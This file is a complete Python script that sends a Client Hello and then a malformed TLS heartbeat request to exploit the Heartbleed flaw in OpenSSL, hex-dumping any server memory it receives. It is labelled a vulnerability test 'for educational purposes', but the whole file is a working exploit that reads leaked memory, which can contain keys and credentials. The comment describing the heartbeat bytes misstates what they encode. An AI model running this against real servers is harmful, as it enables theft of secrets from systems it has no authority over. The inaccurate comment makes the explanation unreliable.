import socket
import struct
import time
import select
from optparse import OptionParser

#============================================================================================================#
#                                                                                                            #
#   Python3 script to test a server for the Heartbleed vulnerability. Only use for educational purposes! :)  #
#                                         Happy testing! :D                                                  #
#                                                                                                            #
#============================================================================================================#

def create_options_parser():
    parser = OptionParser(
        usage='%prog server [options]',
        description='Heartbleed Test'
    )
    parser.add_option(
        '-p', '--port', type='int', default=8443,
        help='Port (default 8443)'
    )
    return parser

# Pre-defined Client Hello
def build_hello_message():
    return bytes.fromhex(
        "16 03 02 00 dc 01 00 00 d8 03 02 53 43 5b 90 9d 9b 72 0b bc 0c bc 2b 92 "
        "a8 48 97 cf bd 39 04 cc 16 0a 85 03 90 9f 77 04 33 d4 de 00 00 66 c0 14 "
        "c0 0a c0 22 c0 21 00 39 00 38 00 88 00 87 c0 0f c0 05 00 35 00 84 c0 12 "
        "c0 08 c0 1c c0 1b 00 16 00 13 c0 0d c0 03 00 0a c0 13 c0 09 c0 1f c0 1e "
        "00 33 00 32 00 9a 00 99 00 45 00 44 c0 0e c0 04 00 2f 00 96 00 41 c0 11 "
        "c0 07 c0 0c c0 02 00 05 00 04 00 15 00 12 00 09 00 14 00 11 00 08 00 06 "
        "00 03 00 ff 01 00 00 49 00 0b 00 04 03 00 01 02 00 0a 00 34 00 32 00 0e "
        "00 0d 00 19 00 0b 00 0c 00 18 00 09 00 0a 00 16 00 17 00 08 00 06 00 07 "
        "00 14 00 15 00 04 00 05 00 12 00 13 00 01 00 02 00 03 00 0f 00 10 00 11 "
        "00 23 00 00 00 0f 00 01 01"
    )

# Malformed pre-defined Heartbeat-Request: 3 bytes (00 03) as payload length, actual payload 16 bytes (40 00)
def build_heartbeat_message():
    return bytes.fromhex("18 03 02 00 03 01 40 00")


# Hexdump; script will dump the data in hexdump format!
def hexdump(data):
    for i in range(0, len(data), 16):
        chunk = data[i:i+16]
        hex_part = ' '.join(f'{byte:02X}' for byte in chunk)
        ascii_part = ''.join((chr(byte) if 32 <= byte <= 126 else '.') for byte in chunk)
        print(f'{i:04x}: {hex_part:<48} {ascii_part}')


# Receive data length from socket
def receive_all(sock, length, timeout=5):
    end_time = time.time() + timeout
    received_data = b''
    while len(received_data) < length:
        remaining_time = end_time - time.time()
        if remaining_time <= 0:
            return None
        readable, _, _ = select.select([sock], [], [], remaining_time)
        if sock in readable:
            chunk = sock.recv(length - len(received_data))
            if not chunk:
                return None
            received_data += chunk
    return received_data

# Receive TLS message from socket
def receive_message(sock):
    header = receive_all(sock, 5)
    if not header:
        print("Record header not be received!")
        return None, None, None

    record_type, version, length = struct.unpack('>BHH', header)
    payload = receive_all(sock, length)
    if not payload:
        print("Record payload not received!")
        return None, None, None

    print(f"Received: type={record_type}, version=0x{version:04X}, length={len(payload)}")
    return record_type, version, payload

# Send Heartbeat-Request and check if server is vulnerable
def send_heartbeat(sock):
    heartbeat_message = build_heartbeat_message()
    sock.sendall(heartbeat_message)

    while True:
        record_type, _, payload = receive_message(sock)
        if record_type is None:
            print("No heartbeat response, server is not vulnerable!")
            return False

        if record_type == 24:  # If Heartbeat response
            print("Heartbeat response received!")
            hexdump(payload)
            if len(payload) > 3:
                print("WARNING: Server is vulnerable and returned more data than expected!")
            else:
                print("Server handled the heartbeat but did not leak data!")
            return True

        if record_type == 21:  # Else alert message
            print("Received an alert message!")
            hexdump(payload)
            print("Server is not vulnerable!")
            return False



def main():
    parser = create_options_parser()
    options, args = parser.parse_args()
    if len(args) < 1:
        parser.print_help()
        return
    server = args[0]
    port = options.port

    print(f"Connecting to {server}:{port}...")
    with socket.create_connection((server, port)) as sock:
        print("Sending Client Hello...")
        sock.sendall(build_hello_message())
        print("Waiting for Server Hello...")

        while True:
            record_type, _, payload = receive_message(sock)
            if record_type is None:
                print("Server closed connection before sending Server Hello.")
                return
            if record_type == 22 and payload[0] == 0x0E:
                break

        print("Sending Heartbeat request...")
        send_heartbeat(sock)

if __name__ == "__main__":
    main()